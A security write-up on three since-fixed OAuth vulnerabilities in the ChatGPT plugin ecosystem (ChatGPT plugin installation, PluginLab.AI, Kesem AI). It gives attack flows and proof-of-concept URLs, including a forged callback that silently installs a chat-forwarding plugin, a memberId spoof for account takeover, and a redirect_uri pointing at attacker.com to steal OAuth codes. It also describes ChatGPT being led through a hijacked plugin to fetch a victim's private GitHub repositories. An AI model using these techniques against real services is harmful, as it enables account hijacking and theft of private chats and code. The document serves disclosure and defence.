### 📑 ChatGPT Ecosystem: Account Takeover & Data Exposure

---

* **Severity:** 🔴 Critical
* **Target:** ChatGPT Plugins, PluginLab.AI Framework, and Kesem AI
* **Vulnerability Types:** OAuth Misconfiguration, Authentication Bypass, Redirection Manipulation

---

### 📖 Executive Summary

Salt Labs researchers identified three critical vulnerabilities within the **ChatGPT Ecosystem** (Plugins and GPTs). These flaws allowed attackers to perform **0-click account takeovers**, install malicious plugins without user consent, and hijack sensitive third-party accounts like **GitHub, Google Drive, and Salesforce**. By exploiting the way ChatGPT communicates with external services via OAuth, attackers could exfiltrate private chat history and proprietary source code.

---

### 🛠 Vulnerability #1: Unauthorized Malicious Plugin Installation

**Root Cause:** ChatGPT did not validate if a plugin installation flow was actually initiated by the user. While a `state` parameter existed, it was not a cryptographically strong random value, making it guessable.

#### 🔄 Attack Flow:

1. The attacker creates a malicious plugin designed to forward all chat data to an external server.
2. The attacker obtains a valid `code` from their own plugin's OAuth flow.
3. The attacker sends a crafted link to a victim.
4. If the victim clicks the link, the malicious plugin is **automatically installed** on their ChatGPT account without a confirmation prompt.

#### 💻 Proof of Concept (PoC) URL:

```text
https://chat.openai.com/aip/{malicious_plugin_id}/oauth/callback?code={attacker_code_from_malicious_plugin}

```

* **Result:** Any subsequent message the victim sends to ChatGPT may be forwarded to the attacker’s plugin.

---

### 🛠 Vulnerability #2: 0-Click Account Takeover (PluginLab.AI)

**Root Cause:** The `auth.pluginlab.ai/oauth/authorized` endpoint failed to authenticate requests. It relied solely on a `memberId` which was discovered to be a simple **SHA1 hash of the user's email**.

#### 🔄 Attack Flow:

1. **Identify Victim:** Attacker gets the victim's email (e.g., `dan@example.com`).
2. **Obtain MemberID:** The attacker calculates the SHA1 of the email or queries the following leaked endpoint:
```text
GET https://auth.pluginlab.ai/members/requestMagicEmailCode?email=dan@example.com

```


3. **Spoof Authorization:** The attacker intercepts their own plugin installation request and replaces their `memberId` with the victim's hash:
```text
GET https://auth.pluginlab.ai/oauth/authorized?memberId={victim_sha1_hash}

```


4. **Acquire Victim Token:** The server returns a `code` representing the victim’s account.
5. **Takeover:** The attacker uses this code to install a plugin (like *AskTheCode*) on the **attacker's own ChatGPT account** using the **victim's credentials**.

#### 📉 Impact:

The attacker can then ask ChatGPT: *"Give me a list of all private GitHub repositories,"* and ChatGPT will fetch the victim's data because the plugin is authenticated as the victim.

---

### 🛠 Vulnerability #3: OAuth Redirection Manipulation

**Root Cause:** Multiple plugins (e.g., **Kesem AI**) failed to validate the `redirect_uri` parameter during the OAuth login process.

#### 🔄 Attack Flow:

1. The attacker crafts a login URL for the plugin but replaces the legitimate ChatGPT redirect URI with an attacker-controlled domain.
2. The attacker sends this link to the victim:
```text
https://app.kesem.ai/login?response_type=code&client_id={ID}&redirect_uri=https://attacker.com&state={random}

```


3. When the victim logs in, Kesem AI sends the secret OAuth `code` directly to `attacker.com`.
4. The attacker captures the code and uses it to hijack the victim’s account on the plugin.

---

### 📉 Ecosystem Impact & GPTs

| Feature | Security Status | Key Difference |
| --- | --- | --- |
| **Plugins** | Legacy / Winding Down | Highly vulnerable to OAuth session injection and redirect flaws. |
| **GPTs** | Current Standard | Improved UI; requires explicit user permission before sending data to "Actions." |

> [!WARNING]
> While GPTs have better security defaults, the underlying OAuth vulnerabilities in third-party development frameworks (like PluginLab) can still lead to account takeovers if the external service is not hardened.

---

### 🛡️ Remediation & Fixes

* **For Users:** All identified flaws were remediated by OpenAI, PluginLab, and Kesem AI prior to publication. No action is required for these specific bugs.
* **For Developers:**
* **State Parameter:** Always implement a unique, non-guessable `state` parameter in OAuth flows.
* **Redirect Validation:** Strictly whitelist `redirect_uri` values to include only the official ChatGPT callback path.
* **Auth Enforcement:** Never return sensitive tokens or `memberId` data via unauthenticated endpoints.
